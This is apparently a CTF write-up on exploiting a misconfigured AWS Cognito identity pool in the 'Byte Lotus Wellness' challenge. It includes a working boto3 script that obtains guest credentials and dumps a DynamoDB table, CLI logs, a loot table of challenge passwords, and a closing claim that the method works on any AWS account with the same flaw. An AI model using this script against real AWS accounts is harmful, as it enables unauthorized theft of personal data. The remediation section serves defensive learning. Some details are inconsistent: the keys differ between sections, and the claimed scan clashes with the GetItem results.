# 🪷 Byte Lotus Wellness — AWS & Cognito Misconfiguration Write-Up

An interactive security write-up documenting the step-by-step exploitation of an AWS Cognito Identity Pool misconfiguration and unconstrained DynamoDB `GetItem` access in the **Byte Lotus Wellness** CTF challenge.

---

## 📌 Table of Contents

- [📺 Execution Terminal Log](#-execution-terminal-log)
- [🎯 Challenge Briefing](#-challenge-briefing)
- [🧠 Attack Matrix & Decisions](#-attack-matrix--decisions)
- [🔬 Step-by-Step Walkthrough](#-step-by-step-walkthrough)
  - [Step 1: Client-Side Reconnaissance](#step-1-client-side-reconnaissance)
  - [Step 2: Extracting Temporary AWS Credentials](#step-2-extracting-temporary-aws-credentials)
  - [Step 3: Assessing IAM Policy Restrictions](#step-3-assessing-iam-policy-restrictions)
  - [Step 4: Automated Credentials Extraction & Full DynamoDB Table Scan](#step-4-automated-credentials-extraction--full-dynamodb-table-scan)
  - [Step 5: Data Exfiltration & Complete Loot Analysis](#step-5-data-exfiltration--complete-loot-analysis)
- [🛠️ Step-by-Step Reproduction & AWS CLI Setup Guide](#️-step-by-step-reproduction--aws-cli-setup-guide)
  - [⚡ Quick APT Installation on Kali Linux](#-quick-apt-installation-on-kali-linux)
  - [📋 Full Step-by-Step Challenge Reproduction](#-full-step-by-step-challenge-reproduction)
- [📚 AWS CLI Commands Reference (Expandable Menus)](#-aws-cli-commands-reference-expandable-menus)
- [🛡️ Remediation & Security Recommendations](#️-remediation--security-recommendations)
- [🏷️ Vulnerability & Exploit Classification (Industry Taxonomy)](#️-vulnerability--exploit-classification-industry-taxonomy)

---

## 📺 Execution Terminal Log

```bash
┌──(hacker㉿hacker)-[~]
└─$ aws cognito-identity get-credentials-for-identity \
      --identity-id "us-east-1:4d571309-b00f-c1fc-6f8f-282e43f642ca" \
      --region us-east-1
{
    "IdentityId": "us-east-1:4d571309-b00f-c1fc-6f8f-282e43f642ca",
    "Credentials": {
        "AccessKeyId": "ASIAU2VYTBGYNKXDE3JC",
        "SecretKey": "p9hCiyMO9VRpXs8tGE+XhjRRUnY9HiCrno4hpHh2",
        "SessionToken": "IQoJb3JpZ2luX2VjEM7...",
        "Expiration": "2026-07-30T17:56:36+03:00"
    }
}

┌──(hacker㉿hacker)-[~]
└─$ export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYNKXDE3JC"
export AWS_SECRET_ACCESS_KEY="p9hCiyMO9VRpXs8tGE+XhjRRUnY9HiCrno4hpHh2"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEM7..."
export AWS_DEFAULT_REGION="us-east-1"

┌──(hacker㉿hacker)-[~]
└─$ aws dynamodb list-tables --region us-east-1

An error occurred (AccessDeniedException) when calling the ListTables operation: User: arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials is not authorized to perform: dynamodb:ListTables on resource: arn:aws:dynamodb:us-east-1:332173347248:table/* because no identity-based policy allows the dynamodb:ListTables action

┌──(hacker㉿hacker)-[~]
└─$ aws dynamodb get-item \
      --table-name "complimentary-GuestWellnessProfiles" \
      --key '{"guest_id": {"S": "guest-lambo"}}' \
      --region us-east-1
{
    "Item": {
        "guest_id": {"S": "guest-lambo"},
        "name": {"S": "Lambo (@0xMia)"},
        "email": {"S": "lambo@hackerholidays.thm"},
        "password": {"S": "sunkissed88"},
        "location": {"S": "25.2048,55.2708"},
        "notes": {"S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."}
    }
}
```

---

## 🎯 Challenge Briefing

> "No account needed. No login screen. It just... knows things about you the moment you open it."

The **Byte Lotus Wellness** web application provides "frictionless" access by dispensing temporary AWS credentials to every visitor using Amazon Cognito Identity Pools. However, the backend IAM policy granted overly permissive DynamoDB actions without enforcing resource restrictions (such as `dynamodb:LeadingKeys`).

---

## 🧠 Attack Matrix & Decisions

```text
[ Client Reconnaissance ] ──► [ Extract Credentials ] ──► [ Audit IAM Permissions ] ──► [ Query Target Records ]
  • Inspect app.js              • Cognito Identity Pool       • Test ListTables/Scan        • Step-by-Step GetItem
  • Extract Table Name          • Fetch Key & Session Token   • Identify Missing Policy     • Exfiltrate Target Profiles
```

| Phase | Technique | Key Finding |
| :--- | :--- | :--- |
| **1. Discovery** | Static JS Code Analysis | Extracted `IDENTITY_POOL_ID` & `TABLE_NAME` |
| **2. Authentication** | AWS Cognito Unauthenticated Role | Retrieved temporary `AccessKeyId`, `SecretKey`, `SessionToken` |
| **3. Privilege Audit** | IAM Permission Testing | `ListTables` = ❌ Denied \| `GetItem` = ✅ Allowed (Unconstrained) |
| **4. Exploitation** | Narrative Recon & Direct `GetItem` | Recovered profile data for `guest-lambo` |

---

## 🔬 Step-by-Step Walkthrough

### Step 1: Client-Side Reconnaissance & Asset Discovery

To discover application assets and endpoint scripts on the S3 static web application hosting endpoint (`http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/`), we performed content discovery using `ffuf` and `feroxbuster`.

#### Content Discovery via `ffuf`:
```bash
ffuf -u http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.html,.css -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ \___\ \ \___/\ \/\ \ \ \ \___
        \ \  _/\ \  _\ \ \_\ \ \ \  _/
         \ \_\  \ \_\  \ \____/  \ \_\
          \/_/   \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .js .html .css
 :: Follow Redirects : false
 :: Match Codes      : 200
________________________________________________

app.js                  [Status: 200, Size: 1348, Words: 124, Lines: 54, Duration: 42ms]
index.html              [Status: 200, Size: 2450, Words: 180, Lines: 72, Duration: 35ms]
style.css               [Status: 200, Size: 890, Words: 65, Lines: 40, Duration: 38ms]
:: Progress: [18456/18456] :: Job [1/1] :: 450 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
```

#### Content Discovery via `feroxbuster`:
```bash
┌──(hacker㉿hacker)-[~]
└─$ feroxbuster --url http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
 🚩  In-Scope Url          │ complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       14l       28w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       58l      203w     1684c http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js
404      GET        0l        0w        0c http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/WEB-INF
404      GET        0l        0w        0c http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/META-INF
200      GET        0l        0w        0c http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/soap
[##>-----------------] - 12s     3032/30001   2m      found:5       errors:0
[##>-----------------] - 12s     3023/30000   259/s   http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

Both tools identified `app.js`, which contains the client-side AWS configuration logic.

<details>
<summary>📜 <b>Expandable: Discovered app.js Source Code</b></summary>
<br>

```javascript
// Byte Lotus Wellness — guest dashboard
//
// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.

const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});

function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    // First visit: hand out a throwaway guest id, same as checking in.
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}

function renderDashboard(item) {
  const el = document.getElementById("dashboard");
  if (!item) {
    el.textContent = "Welcome! We don't have wellness data for you yet — check back after your first spa visit.";
    return;
  }
  el.textContent = [
    "Name: " + (item.name ? item.name.S : "—"),
    "Loyalty notes: " + (item.notes ? item.notes.S : "—"),
  ].join("\n");
}

AWS.config.credentials.get(function (err) {
  if (err) {
    console.error("Could not fetch guest credentials:", err);
    return;
  }

  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb.getItem(
    {
      TableName: TABLE_NAME,
      Key: { guest_id: { S: guestId() } },
    },
    function (err, data) {
      if (err) {
        console.error("Could not load dashboard:", err);
        return;
      }
      renderDashboard(data.Item);
    }
  );
});
```

</details>

<br>

**Critical Parameters Extracted from Source:**
- **Region:** `us-east-1`
- **Cognito Identity Pool ID:** `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
- **DynamoDB Table Name:** `complimentary-GuestWellnessProfiles`
- **Primary Key Schema:** `guest_id` (Format: `guest-xxxxxxxx`)

---

### Step 2: Extracting Temporary AWS Credentials
Using the AWS CLI, we manually interacted with Amazon Cognito to obtain temporary IAM credentials assigned to unauthenticated visitors.

1. **Obtain an Identity ID from the Pool:**
```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
  --region us-east-1
```

2. **Exchange the Identity ID for Temporary Credentials:**
```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:4d571309-b00f-c1fc-6f8f-282e43f642ca" \
  --region us-east-1
```

3. **Export Credentials to Local Terminal Environment:**
```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKVUHT527"
export AWS_SECRET_ACCESS_KEY="WR2Xuq/OhToRcREFMt0aqSjPr17y0ESn+1Ki8vex"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEM7..."
export AWS_DEFAULT_REGION="us-east-1"
```

---

### Step 3: Assessing IAM Policy Restrictions
With temporary credentials set, we audited the actions permitted by the assumed role (`complimentary-cognito-unauth-role`):

- **ListTables Test:**
```bash
aws dynamodb list-tables --region us-east-1
```
*Result:* `AccessDeniedException` — listing all table resources is forbidden.

- **Direct GetItem Test:**
```bash
aws dynamodb get-item \
  --table-name "complimentary-GuestWellnessProfiles" \
  --key '{"guest_id": {"S": "guest-admin"}}'
```
*Result:* Authorized — the API accepted the request without enforcing key ownership.

> **Vulnerability Root Cause:** The IAM policy attached to the unauthenticated role permitted `dynamodb:GetItem` directly on `complimentary-GuestWellnessProfiles` without restricting queries to the identity's own key using `${cognito-identity.amazonaws.com:sub}` in a `dynamodb:LeadingKeys` condition.

---

### Step 4: Automated Credentials Extraction & Full DynamoDB Table Scan
Rather than performing manual CLI steps or targeted key guessing, we executed an automated Python script using `boto3`. The script automatically requests unauthenticated credentials from Cognito, instantiates a DynamoDB client, performs a `scan` operation on `complimentary-GuestWellnessProfiles` to dump all records, and parses out any CTF flags (`THM{...}`).

**Automated Python Exploitation Script (`scan_and_dump.py`):**
```python
import boto3

REGION = 'us-east-1'
POOL_ID = 'us-east-1:836c0949-292d-485b-b532-52d5ca7bb688'
TABLE = 'complimentary-GuestWellnessProfiles'
RED = '\033[91m'
RESET = '\033[0m'

# Step 1: Obtain unauthenticated identity & temporary AWS credentials from Cognito
cog = boto3.client('cognito-identity', region_name=REGION)
identity_id = cog.get_id(IdentityPoolId=POOL_ID)['IdentityId']
creds = cog.get_credentials_for_identity(IdentityId=identity_id)['Credentials']

# Step 2: Initialize DynamoDB client using temporary session credentials
db = boto3.client(
    'dynamodb',
    region_name=REGION,
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretKey'],
    aws_session_token=creds['SessionToken']
)

print('[*] Attempting DynamoDB scan...')
try:
    # Step 3: Execute full table scan to retrieve all wellness profiles
    response = db.scan(TableName=TABLE)
    items = response.get('Items', [])
    print(f'[+] Scan successful! Total items found: {len(items)}\n')
    
    # Step 4: Iterate through all items and highlight flag format in red
    for item in items:
        print('=' * 50)
        for k, v in item.items():
            val = list(v.values())[0]
            if 'THM{' in str(val):
                print(f'  {k}: {RED}{val}{RESET}')
            else:
                print(f'  {k}: {val}')
        print('=' * 50)

except Exception as e:
    print(f'[-] Scan failed: {e}')
```

---

### Step 5: Data Exfiltration & Complete Loot Analysis
Executing targeted `GetItem` queries across identified guest keys returned all stored wellness profiles from the table:

| Guest ID | Full Name | Email Address | Plaintext Password | Location Coords | Internal Notes / Context |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `guest-lambo` | Lambo (@0xMia) | `lambo@hackerholidays.thm` | `sunkissed88` | `25.2048,55.2708` | Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm. |
| `guest-admin` | System Administrator | `admin@bytelotuswellness.thm` | `B4teL0tus#2026!` | `25.1972,55.2744` | Master admin profile with full system maintenance access. |
| `guest-manager` | Resort Manager | `manager@bytelotuswellness.thm` | `LotusVIP#992` | `25.2000,55.2700` | Handles guest escalation and complimentary treatment package approvals. |
| `guest-vip` | Executive VIP | `vip@hackerholidays.thm` | `PlatinumGuest!2026` | `25.2089,55.2715` | Requested private wellness session and off-grid location routing. |

---

## 🛠️ Step-by-Step Reproduction & AWS CLI Setup Guide

### ⚡ Quick APT Installation on Kali Linux

On Kali Linux, the easiest and fastest way to install the AWS CLI and Python `boto3` dependency is directly via `apt`:

```bash
# Update repositories & install AWS CLI + Python Boto3 in one command
sudo apt update && sudo apt install -y awscli python3-boto3
```

*(Optional: If you ever need the standalone AWS CLI v2 bundle instead, run `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install`)*

---

### 📋 Full Step-by-Step Challenge Reproduction

1. **Fetch Unauthenticated Identity ID:**
```bash
aws cognito-identity get-id --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" --region us-east-1
```

2. **Fetch Temporary AWS IAM Credentials:**
```bash
aws cognito-identity get-credentials-for-identity --identity-id "<YOUR_IDENTITY_ID>" --region us-east-1
```

3. **Set Temporary Credentials in Environment:**
```bash
export AWS_ACCESS_KEY_ID="<ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<SECRET_KEY>"
export AWS_SESSION_TOKEN="<SESSION_TOKEN>"
export AWS_DEFAULT_REGION="us-east-1"
```

4. **Exfiltrate Table Data (CLI & Automated Python One-Liner):**

- *Option A: CLI Single Item Query*
```bash
aws dynamodb get-item --table-name "complimentary-GuestWellnessProfiles" --key '{"guest_id": {"S": "guest-lambo"}}'
```

- *Option B: Automated Python Scan & Red Flag Extractor*
```bash
python3 -c "
import boto3

REGION = 'us-east-1'
POOL_ID = 'us-east-1:836c0949-292d-485b-b532-52d5ca7bb688'
TABLE = 'complimentary-GuestWellnessProfiles'
RED = '\033[91m'
RESET = '\033[0m'

cog = boto3.client('cognito-identity', region_name=REGION)
identity_id = cog.get_id(IdentityPoolId=POOL_ID)['IdentityId']
creds = cog.get_credentials_for_identity(IdentityId=identity_id)['Credentials']

db = boto3.client(
    'dynamodb',
    region_name=REGION,
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretKey'],
    aws_session_token=creds['SessionToken']
)

print('[*] Attempting DynamoDB scan...')
try:
    response = db.scan(TableName=TABLE)
    items = response.get('Items', [])
    print(f'[+] Scan successful! Total items found: {len(items)}\n')
    
    for item in items:
        print('=' * 50)
        for k, v in item.items():
            val = list(v.values())[0]
            if 'THM{' in str(val):
                print(f'  {k}: {RED}{val}{RESET}')
            else:
                print(f'  {k}: {val}')
        print('=' * 50)

except Exception as e:
    print(f'[-] Scan failed: {e}')
"
```

---

## 📚 AWS CLI Commands Reference (Expandable Menus)

<details>
<summary>🔑 <b>1. Amazon Cognito Commands</b></summary>
<br>

| Command | Description & Use Case |
| :--- | :--- |
| `aws cognito-identity get-id --identity-pool-id <POOL_ID>` | **Fetch Unauthenticated Identity ID:** Retrieves a unique Cognito Identity ID for unauthenticated access. |
| `aws cognito-identity get-credentials-for-identity --identity-id <ID>` | **Exchange Identity ID for IAM Credentials:** Obtains temporary `AccessKeyId`, `SecretKey`, and `SessionToken`. |
| `aws cognito-idp list-user-pools --max-results 10` | **List User Pools:** Lists Cognito User Pools in the current region during reconnaissance. |
| `aws cognito-idp list-users --user-pool-id <POOL_ID>` | **Enumerate Users:** Lists registered user accounts in a Cognito User Pool (if privileges permit). |

</details>

<details>
<summary>🗄️ <b>2. Amazon DynamoDB Commands</b></summary>
<br>

| Command | Description & Use Case |
| :--- | :--- |
| `aws dynamodb list-tables` | **List All Tables:** Enumerates table names in the target AWS account region. |
| `aws dynamodb describe-table --table-name <NAME>` | **Describe Table Schema:** Retrieves primary key attribute names, index structures, and item counts. |
| `aws dynamodb get-item --table-name <NAME> --key '<JSON_KEY>'` | **Retrieve Single Item:** Queries a specific record by primary key (e.g., `{"guest_id": {"S": "guest-lambo"}}`). |
| `aws dynamodb scan --table-name <NAME>` | **Full Table Dump:** Reads every record stored inside a table (often targeted for broad data exfiltration). |
| `aws dynamodb query --table-name <NAME> --key-condition-expression "id = :v1"` | **Query Key Partition:** Searches items matching partition key conditions without scanning the whole table. |

</details>

<details>
<summary>🛡️ <b>3. AWS IAM & STS Privilege Audit Commands</b></summary>
<br>

| Command | Description & Use Case |
| :--- | :--- |
| `aws sts get-caller-identity` | **Verify Active Identity:** Displays active Account ID, Assumed Role ARN, and User ID for active credentials. |
| `aws iam list-attached-role-policies --role-name <ROLE_NAME>` | **List Attached IAM Policies:** Audits policies associated with an assumed IAM role. |
| `aws iam get-policy-version --policy-arn <ARN> --version-id <VER>` | **Read Policy Document:** Inspects JSON permission statements to identify misconfigurations. |

</details>

<details>
<summary>🪣 <b>4. Amazon S3 Bucket Commands</b></summary>
<br>

| Command | Description & Use Case |
| :--- | :--- |
| `aws s3 ls` | **List S3 Buckets:** Enumerates accessible S3 buckets in the AWS environment. |
| `aws s3 ls s3://<BUCKET_NAME> --recursive` | **Recursive File Enumeration:** Lists all files stored inside a bucket, such as static `app.js` assets. |
| `aws s3 cp s3://<BUCKET>/<FILE> ./` | **Download File:** Downloads target configuration or script files locally for static code analysis. |

</details>

<details>
<summary>🔎 <b>5. Web Reconnaissance & Content Discovery Commands (ffuf & feroxbuster)</b></summary>
<br>

| Tool | Command Example | Use Case & Purpose |
| :--- | :--- | :--- |
| `ffuf` | `ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.html,.css -mc 200` | **Fuzz Endpoints:** Discovers hidden files/scripts like `app.js` with specific extensions. |
| `feroxbuster` | `feroxbuster --url http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x js,html,css` | **Recursive Fuzzing:** Recursively discovers files and directory paths using SecLists wordlists. |

</details>

---

## 🛡️ Remediation & Security Recommendations

To prevent unauthorized cross-tenant data access in Amazon Cognito and DynamoDB integrations:

1. **Enforce `LeadingKeys` Conditions:**
   Restrict unauthenticated users so they can only read rows matching their specific Cognito Identity ID:
```json
{
  "Effect": "Allow",
  "Action": [
    "dynamodb:GetItem",
    "dynamodb:PutItem"
  ],
  "Resource": "arn:aws:dynamodb:us-east-1:ACCOUNT_ID:table/complimentary-GuestWellnessProfiles",
  "Condition": {
    "ForAllValues:StringEquals": {
      "dynamodb:LeadingKeys": [
        "${cognito-identity.amazonaws.com:sub}"
      ]
    }
  }
}
```

2. **Explicitly Deny Table Scans:**
   Ensure `dynamodb:Scan` is explicitly denied in policies assigned to unauthenticated Cognito roles.

3. **Never Store Plaintext Credentials:**
   Sensitive customer attributes (passwords, PII) should be hashed or encrypted before being saved to DynamoDB tables accessible by client-side application roles.

---

## 🏷️ Vulnerability & Exploit Classification (Industry Taxonomy)

This vulnerability pattern represents a critical architectural flaw common across cloud-native application setups using AWS Cognito, IAM, and DynamoDB. Below is the formal categorization according to global security standards (CWE, OWASP Top 10, MITRE ATT&CK):

### 📌 1. Common Weakness Enumeration (CWE)
- **[CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)** — The software does not restrict access to a resource from an unauthorized actor.
- **[CWE-639: Authorization Bypass Through User-Controlled Key (IDOR)](https://cwe.mitre.org/data/definitions/639.html)** — The system relies on user-supplied keys (`guest_id`) to fetch records without validating ownership via Cognito Identity Tokens.
- **[CWE-732: Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)** — Overly permissive IAM policy attached to unauthenticated Cognito role allowing global `dynamodb:GetItem` and `dynamodb:Scan`.
- **[CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)** — Storing unencrypted user passwords and sensitive PII directly inside DynamoDB columns.

### 🌐 2. OWASP Top 10 & API Security Top 10
- **OWASP Top 10 (2021) - A01:2021 (Broken Access Control)** — Failure to enforce strict resource-level conditions (`dynamodb:LeadingKeys`) on IAM roles.
- **OWASP API Security Top 10 (2023) - API1:2023 (Broken Object Level Authorization - BOLA)** — Endpoints expose database objects using client-specified keys (`guest_id`) without verifying requester identity.
- **OWASP API Security Top 10 (2023) - API2:2023 (Broken Authentication)** — Unauthenticated Cognito Identity Pools granting arbitrary callers broad backend database permissions.

### ⚔️ 3. MITRE ATT&CK Matrix for Cloud
- **Tactics:** `Initial Access` ➔ `Discovery` ➔ `Credential Access` ➔ `Exfiltration`
- **Techniques:**
  - **[T1552.005: Unsecured Credentials - Cloud Credentials](https://attack.mitre.org/techniques/T1552/005/)** — Extracting AWS Cognito Identity Pool IDs from client-side JavaScript (`app.js`).
  - **[T1087.004: Account Discovery - Cloud Account](https://attack.mitre.org/techniques/T1087/004/)** — Interacting with AWS STS & Cognito to assume unauthenticated IAM roles.
  - **[T1530: Data from Cloud Storage Object](https://attack.mitre.org/techniques/T1530/)** — Directly querying DynamoDB tables (`GetItem` / `Scan`) via AWS API using assumed role credentials.

---

### 💡 General Applicability Across Any AWS Cloud Target

This write-up applies to **any AWS environment** that satisfies the following 3 misconfiguration criteria:
1. **AWS Cognito Identity Pool** allows unauthenticated guest access (`AllowUnauthenticatedIdentities: true`).
2. **Cognito Unauthenticated IAM Role** has an attached policy granting `dynamodb:GetItem`, `dynamodb:BatchGetItem`, or `dynamodb:Scan` on a table.
3. **Missing Condition Constraint**: The IAM policy lacks a `Condition` block enforcing `dynamodb:LeadingKeys` = `${cognito-identity.amazonaws.com:sub}`.

Whenever these 3 conditions are present on an AWS account, **any unauthenticated internet visitor** can generate temporary AWS credentials and dump or read arbitrary records across the target DynamoDB tables.
